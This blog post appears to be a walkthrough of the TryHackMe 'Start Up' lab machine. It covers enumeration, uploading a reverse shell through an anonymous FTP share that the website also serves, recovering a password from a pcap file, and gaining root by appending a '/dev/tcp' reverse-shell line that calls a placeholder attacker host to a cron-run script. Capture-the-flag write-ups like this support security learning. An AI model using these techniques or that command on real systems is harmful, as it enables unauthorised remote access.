---
author:
  name: "papadope"
date: 2020-11-09
linktitle: Start Up
type:
- post
title: Start Up
weight: 10
series:
- Tryhackme
---

![Room Image](/startup/startuproom.jpg)

## Deploy

First of all, let’s deploy our machine. So click on the green deploy button if you haven’t done it already. Afterwards, to access the machine, you need to be inside TryHackMe network. So, get connected to THM VPN. We are not going to talk here about how can you connect to the VPN but there are awesome guides out there that can help you manage the frustration.

This is a small room to be honest. It’s one of the smallest room that i have ever done inside THM, but that doesn’t mean that it’s not fun to play with it!

---

## Enumeration

![nmap scan](/startup/nmap.png)

I started with a simple nmap scan, just looking for the first 1000 ports. As you can see there is **ftp** , **ssh** and **http** open. I instantly jumped for the ftp one because you can log in anonymously and there is a *notice.txt* inside.

* While i was investigating the ftp port I started a gobuster session in the background.

---

### FTP

![ftp img](/startup/ftpdownload.png)

I connected to **ftp** anonymously closed the prompt and download the hole directory locally.

* While you can pick every single file with the ``get`` command, why don't you grab the hole directory with ``mget *`` 🤔 ?

#### Inside notice.txt

![notice txt](/startup/noticetxt.png)

_At this point, i left the **ftp** completely and went back to **http**._

---

### HTTP

I visited the site first.

![port 80](/startup/port80.png)

I read the code behide it, but nothing. Then i remembered that i left **gobuster** running in the background.

I read the results from **gobuster**.

![gobuster](/startup/gobuster.png)

As you can see there is an interesting directory named **files** there. I visited it and this is what i saw.

![filesdirectory](/startup/filesdirectory.png)

Now what we can understand from that is **ftp** and **http** are synced. And we have the permission inside the *ftp* folder to upload anything we want inside it.

* There are two ways of looking about the permissions that we have on **ftp** folder inside **files** directory :

    1. Through ftp access.
    2. Reading closely the **nmap** scan we did before.

So, I uploaded a reverse shell of course!😏

![upload](/startup/uploadingreverse.png)

I started my **netcat** and went to ``startup.thm/files/ftp``. I clicked on the reverse shell that i have uploaded and i got it.

#### Reverse Shell Stabilization

![stabilization](/startup/stabilization.png)

1. Use python to spawn a better featured bash shell :

```

python -c 'import pty;pty.spawn("/bin/bash")'

```

2. Use **xterm** to access term commands such as *clear* :

```

export TERM=xterm

```

3. Last, background your shell using ``Ctrl + Z`` and inside your own terminal write :

```

stty raw -echo; fg

```
    
* This does two things :

   1. Turns off our own terminal echo (which gives us access to tab autocompletes, arrow keys, etc).
   2. Foregrounds the shell, thus completing the process.

And we got our perfect shell! Now search for the secret ingredient 🔍

After searching and looking for a way to become lennie user I looked the files I already had. Do you remember that **pcap** file? It was inside the **ftp** server. Go open it with **Wireshark** and try reading through it!

---

#### Pcap File

Inside the **pcap** file I found some TCP Streams interesting. While investigating I saw something that looked like a terminal.

![wireshark](/startup/wireshark.png)

Inside there I found the password for **lennie** user.

---

### Privilege Escalation

After running **linpeas** & **lse** scripts I got nothing to use. So I started manually privesc. I looked inside the **home** directory of lennie user and I saw an interesting directory called **scripts**. Inside it there was another interesting file called **planner.sh**. If you read through the file you are going to realize that another location of a file is hidden in there. Read through that file too.

As you can see we can't write inside the **planner.sh**, but we can write inside the other file called **print.sh** inside **etc**. This file has perms and it's owned by the user we currently use so I changed the file input with the command :

```

echo "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1" >> print.sh

```

* Further investigation with an excellent tool called **pspy64** I saw that the *.sh* file was actually a cron job!

![cronjob](/startup/pspy64s.png)

You can get **pspy** [here](https://github.com/DominicBreuker/pspy).

I wasn't aware of that tool so thank [🥩briskets](https://briskets.io) for that!

--- 

### Root

After that everything was simple. I started a **netcat** listener with the port I inserted inside the **print.sh** file and waited until the cronjob executed.

![cronjobexecuted](/startup/root.png)

Thank you very much for reading.